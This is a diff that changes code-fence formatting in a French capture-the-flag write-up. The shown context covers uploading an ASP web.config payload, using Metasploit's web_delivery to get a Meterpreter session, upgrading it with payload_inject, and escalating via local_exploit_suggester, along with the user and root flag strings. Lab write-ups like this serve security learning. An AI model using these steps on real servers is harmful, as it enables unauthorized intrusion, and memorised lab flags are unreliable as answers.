@@ -81,7 +81,7 @@ print("errored", errored)
 
 L'output est le suivant :  
 
-```plain
+```
 succeed {'.01.jpg', '.opml.config', '.jpg', '.gif', '.003.l.jpg', '.thumb.jpg', '.001.l.jpg', '.l.jpg', '.png', '.docx', '.doc', '.002.l.jpg', '.003.jpg', '.004.jpg', '.0.jpg', '.config', '.xls', '.004.l.jpg', '.006.l.jpg', '.01-l.jpg', '.doc.doc', '.jpg.jpg', '.xlsx', '.jpeg'}
 ```
 
@@ -91,7 +91,7 @@ Mais surtout on trouve un article de blog indiquant [qu'il est possible de place
 
 Encore faut-il s'avoir quoi mettre comme instructions ASP... Une recherche rapide permet de s'avoir comment exécuter un programme externe, il suffit alors de coupler ça avec (par exemple) le module web-delivery de Metasploit :  
 
-```plain
+```
 msf exploit(multi/script/web_delivery) > exploit
 [*] Exploit running as background job 3.
 
@@ -136,7 +136,7 @@ set oWSH = nothing
 
 Et une fois uploadé et appelé on obtient notre session Meterpreter :  
 
-```plain
+```
 msf exploit(multi/script/web_delivery) > 
 [*] 10.10.10.93      web_delivery - Delivering Payload
 [*] Sending stage (179779 bytes) to 10.10.10.93
@@ -177,7 +177,7 @@ Cet accès nous permet d'accéder au flag utilisateur (e29ad89891462e0b09741e308
 
 Comme le système est un x64 et que la session Meterpreter tourne en x86 on va l'*upgrader* à l'aide du module *payload\_inject* qui va ici lancer un notepad.exe et injecter un shellcode x64 pour ouvrir une autre session Meterpreter dans la bonne architecture.  
 
-```plain
+```
 msf exploit(windows/local/payload_inject) > show options
 
 Module options (exploit/windows/local/payload_inject):
@@ -219,7 +219,7 @@ msf exploit(windows/local/payload_inject) > exploit
 
 On peut difficilement faire plus simple qu'une recherche d'exploits existants pour le système et leur exécution. Ca tombe bien c'est ce qu'il faut faire sur ce CTF :  
 
-```plain
+```
 msf post(multi/recon/local_exploit_suggester) > exploit
 
 [*] 10.10.10.93 - Collecting local exploits for x64/windows...
@@ -269,7 +269,7 @@ On a alors accès au flag root (c837f7b699feef5475a0c079f9d4f5ea)
 
 Pour les curieux voici le code du script d'upload :  
 
-```plain
+```
 using System;
 using System.Data;
 using System.Configuration;
